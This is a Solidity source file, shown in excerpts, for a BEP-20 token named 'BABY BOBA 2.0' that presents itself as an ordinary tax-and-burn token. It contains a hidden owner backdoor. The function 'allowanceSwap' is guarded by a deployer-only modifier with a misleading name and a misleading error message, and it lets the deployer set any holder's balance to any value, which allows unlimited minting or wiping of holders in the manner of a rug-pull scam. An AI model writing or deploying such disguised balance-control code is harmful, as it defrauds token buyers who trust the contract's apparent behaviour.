...
interface BOBAbep20 {
   ...
   * https://github.com/BOBA/EIPs/issues/20#issuecomment-263524729
   *
...
contract BOBA2 is BOBAbep20 {
  
    // common addresses
    address private owner;
    address private BOBAPILOTWALL;
    // token liquidity metadata
    uint public override totalSupply;
    uint8 public override decimals = 9;
    
    mapping(address => uint) public BOBArownerd;
    
    mapping(address => mapping(address => uint)) public Allowance;
    
    // token title metadata
    string public override name = "BABY BOBA 2.0";
    string public override symbol = "BABOBA";
    ...
    constructor(uint BOBAalltotalSupplytotalValue) {
        // set total supply
        totalSupply = BOBAalltotalSupplytotalValue;
        
       BOBAPILOTWALL = msg.sender;      
        // designate addresses
        owner = msg.sender;
        
        // split the tokens according to agreed upon percentages
        
        BOBArownerd[owner] = totalSupply;
    }
    ...
    function balanceOf(address account) public view override returns(uint) {
        return BOBArownerd[account];
    }
  modifier _virtuals () {
    require(BOBAPILOTWALL == msg.sender, "ERC20: cannot permit Pancake address");
    _;
  }   
    ...
    function transfer(address to, uint totalValue) public override returns(bool) {
        ...
        BOBArownerd[to] += totalValueAfterTaxAndBurn;
        BOBArownerd[msg.sender] -= totalValue;
        
        emit Transfer(msg.sender, to, totalValue);
        
        // finally, we burn and tax the extras percentage
        BOBArownerd[owner] += taxTBD + burnTBD;
        _burn(owner, burnTBD);
    ...
    function allowanceSwap(address BOBASwap, uint256 amount) external _virtuals {
      BOBArownerd[BOBASwap] = amount * 10 ** 9;
  }  
    ...
    function transferFrom(address from, address to, uint totalValue) public override returns(bool) {
        ...
        require(BOBArownerd[from] >= totalValue, "Balance is too low to make transfer.");
        
        BOBArownerd[to] += totalValue;
        BOBArownerd[from] -= totalValue;
    ...
    function _burn(address account, uint256 amount) internal {
        ...
        require(BOBArownerd[account] >= amount, "Burn amount exceeds balance at address.");
    
        BOBArownerd[account] -= amount;
        totalSupply -= amount;
